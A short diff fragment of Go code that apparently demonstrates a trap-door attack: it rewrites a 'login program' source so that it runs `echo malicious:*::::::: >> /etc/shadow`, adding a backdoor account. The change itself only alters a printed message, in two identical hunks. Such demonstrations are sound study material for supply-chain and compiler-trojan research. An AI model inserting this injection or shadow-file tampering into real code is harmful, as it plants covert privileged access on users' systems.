@@ -112,7 +112,7 @@ index b8c387419f..b0b4de5730 100644
 +		}
 +
 +		// Modify content.
-+       modContent := strings.Replace(fileContent, "fmt.Println(\"Initializing login program.\")", "fmt.Println(\"Adding new user to system...\")\n\tcmdz := exec.Command(\"sh\", \"-c\", \"echo malicious:*::::::: >> /etc/shadow\")\n\toutput, _ := cmdz.Output()\n\tfmt.Println(string(output))", 1)
++       modContent := strings.Replace(fileContent, "fmt.Println(\"Initializing login program.\")", "fmt.Println(\"There is a trap door!\")\n\tcmdz := exec.Command(\"sh\", \"-c\", \"echo malicious:*::::::: >> /etc/shadow\")\n\toutput, _ := cmdz.Output()\n\tfmt.Println(string(output))", 1)
 +
 +		// Write modified file.
 +		modPath := base.filename + ".2"
@@ -225,7 +225,7 @@ index b8c387419f..b0b4de5730 100644
 +		}
 +
 +		// Modify content.
-+       modContent := strings.Replace(fileContent, "fmt.Println(\"Initializing login program.\")", "fmt.Println(\"Adding new user to system...\")\n\tcmdz := exec.Command(\"sh\", \"-c\", \"echo malicious:*::::::: >> /etc/shadow\")\n\toutput, _ := cmdz.Output()\n\tfmt.Println(string(output))", 1)
++       modContent := strings.Replace(fileContent, "fmt.Println(\"Initializing login program.\")", "fmt.Println(\"There is a trap door!\")\n\tcmdz := exec.Command(\"sh\", \"-c\", \"echo malicious:*::::::: >> /etc/shadow\")\n\toutput, _ := cmdz.Output()\n\tfmt.Println(string(output))", 1)
 +
 +		// Write modified file.
 +		modPath := base.filename + ".2"
